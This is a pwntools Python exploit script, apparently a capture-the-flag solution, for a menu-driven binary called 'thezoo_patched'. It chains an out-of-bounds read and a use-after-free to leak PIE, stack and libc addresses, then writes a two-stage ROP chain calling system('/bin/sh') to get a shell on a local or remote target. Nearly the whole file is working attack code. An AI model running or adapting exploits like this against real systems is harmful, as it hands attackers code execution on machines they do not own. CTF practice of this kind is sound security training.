#!/usr/bin/env python3

from pwn import *
context.terminal = ["tmux", "splitw", "-h"]
encode = lambda e: e if type(e) == bytes else str(e).encode()
hexleak = lambda l: int(l[:-1] if l[-1] == '\n' else l, 16)
fixleak = lambda l: unpack(l[:-1].ljust(8, b"\x00"))

exe = "./thezoo_patched"
elf = context.binary = ELF(exe)
libc = elf.libc
io = remote(sys.argv[1], int(sys.argv[2])
	) if args.REMOTE else process([exe], aslr=True)
if args.GDB: gdb.attach(io, """
	b *main+310
""")

def menu(idx, delim=":", ln=True):
	sender = io.sendlineafter if ln else io.sendafter
	sender(encode(delim), encode(idx))

def create_owner(name):
	menu(1)
	menu(name)

def create_animal(name, price, ln=True):
	menu(3)
	menu(name, ln=ln)
	menu(price)

def delete_animal(idx):
	menu(4)
	menu(idx)

def modify_animal(idx, name, price):
	menu(5)
	menu(idx)
	menu(name)
	menu(price)

def print_animal(idx):
	menu(7)
	menu(idx)

def create_zoo(name):
	menu(8)
	menu(name, ln=False)

def delete_zoo(idx):
	menu(9)
	menu(idx)

def visit_zoo(idx):
	menu(10)
	menu(idx)

def get_leak(idx):
	create_zoo("A")
	delete_zoo(idx)
	create_animal(b"A"*0x10, 0x1337, ln=False)
	io.recvuntil(b"A"*0x10)
	return fixleak(io.recv(7))

def do_rop(idx, addr, chain):
	create_animal("BBBBBBBB", 0x1337)
	delete_animal(idx)
	create_owner(addr)
	print("Writing %#x bytes of rop chain.." % len(chain))
	modify_animal(idx, chain, 0x1337)

""" Get PIE and Stack leak using OOB read and UAF """
elf.address = get_leak(0) - 0x1e12
info(f"elf.address @ %#x" % elf.address)

stack = get_leak(1)
info("stack @ %#x" % stack)
ret = stack + 0x78
info("return @ %#x" % ret)

""" Get Libc Leak """
delete_animal(0)
create_owner(pack(elf.got.printf))
print_animal(0)
io.recvuntil(b"Name: ")
libc.address = fixleak(io.recv(7)) - libc.sym.printf
info("libc @ %#x" % libc.address)

POP_RDI = libc.address + 0x000000000010f75b
RET     = libc.address + 0x000000000002882f

"""
Since we're limited to 0x18 bytes,
we'll need to write the ROP chain in
two gos.

If we go in a single go, `system` will
fail because of MOVAPS instruction
and stack alignment
"""
pack(ret)
do_rop(2, pack(ret), flat(POP_RDI, next(libc.search(b"/bin/sh\x00"))))
do_rop(3, pack(ret+0x10), flat(RET, libc.sym.system))
menu(0)
io.interactive()
